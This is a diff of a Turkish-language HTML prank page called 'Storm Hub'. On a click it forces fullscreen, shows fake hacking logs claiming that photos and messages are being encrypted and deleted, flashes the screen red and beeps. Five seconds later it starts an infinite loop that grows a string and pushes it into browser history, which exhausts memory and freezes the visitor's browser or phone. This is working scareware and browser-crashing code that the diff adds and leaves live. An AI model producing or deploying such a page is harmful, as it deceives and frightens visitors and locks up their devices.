@@ -1,28 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Güncellemesi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Onarımı - Storm Hub</title>
+    <style>
+        body { background-color: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow: hidden; margin: 0; padding: 20px; user-select: none; }
+        #status { font-size: 14px; line-height: 1.5; }
+        .red { color: #ff0000; font-weight: bold; }
+        #progress-bar { width: 0%; height: 20px; background-color: #00ff00; margin-top: 10px; transition: width 0.1s; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.1); display: none; pointer-events: none; }
+    </style>
 </head>
-<body style="background:black; color:red; text-align:center; padding-top:100px; font-family:sans-serif;">
-    <h1>⚠ SİSTEM KRİTİK HATASI ⚠</h1>
-    <p>Cihazınızda STORM_VIRUS.EXE tespit edildi.</p>
-    <p>Verileriniz korunuyor, lütfen tarayıcıyı kapatmayın...</p>
+<body>
 
-    <script>
-        // Kullanıcı sayfaya tıkladığı an tam ekran yap ve kilitlemeyi başlat
-        document.addEventListener("click", function() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
+<div id="status">
+    [SYSTEM] Booting Storm_Exploit_v4.2...<br>
+    [INFO] Bağlantı kuruluyor: 192.168.1.104... OK<br>
+    [WARN] Güvenlik duvarı aşılıyor... %100<br>
+    <span class="red">[!] KRİTİK HATA: KERNEL_DATA_INPAGE_ERROR</span><br>
+    [SYSTEM] Cihaz hafızası okunuyor...<br>
+    [DANGER] Fotoğraflar ve Mesajlar şifreleniyor...
+</div>
+<div id="progress-bar"></div>
+<div id="overlay" class="overlay"></div>
+
+<script>
+    // 1. SES EFEKTİ (Hata bip sesi)
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    function playErrorSound() {
+        const oscillator = audioCtx.createOscillator();
+        oscillator.type = 'square';
+        oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+        oscillator.connect(audioCtx.destination);
+        oscillator.start();
+        setTimeout(() => oscillator.stop(), 200);
+    }
+
+    document.addEventListener("click", function() {
+        // Tam Ekran Yap
+        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        
+        // Şakayı Başlat
+        let status = document.getElementById('status');
+        let bar = document.getElementById('progress-bar');
+        let overlay = document.getElementById('overlay');
+        let width = 0;
+
+        // Görsel Kaos Başlıyor
+        setInterval(() => {
+            width += 0.5;
+            if (width <= 100) bar.style.width = width + "%";
             
-            // RAM'i şişirme ve tarayıcıyı dondurma döngüsü
-            let chaos = "STORM_HACK_";
+            let p = document.createElement('div');
+            p.innerHTML = "[ERROR] 0x" + Math.floor(Math.random()*16777215).toString(16) + " Veri Silindi!";
+            if (Math.random() > 0.8) p.className = "red";
+            status.appendChild(p);
+            window.scrollTo(0, document.body.scrollHeight);
+            
+            // Ekranı kırmızı flaş gibi yakıp söndür
+            overlay.style.display = (overlay.style.display === 'none') ? 'block' : 'none';
+            
+            if (Math.random() > 0.95) playErrorSound();
+        }, 100);
+
+        // RAM VE İŞLEMCİ KİLİTLEME (Cihazı donduran kısım)
+        setTimeout(() => {
+            let crash = "STORM";
             while(true) {
-                chaos += chaos + Math.random();
-                history.pushState(null, null, chaos);
+                crash += crash + Math.random();
+                history.pushState(null, null, crash);
             }
-        });
-    </script>
+        }, 5000); // 5 saniye sonra telefon kilitlenir
+    });
+</script>
 </body>
 </html>
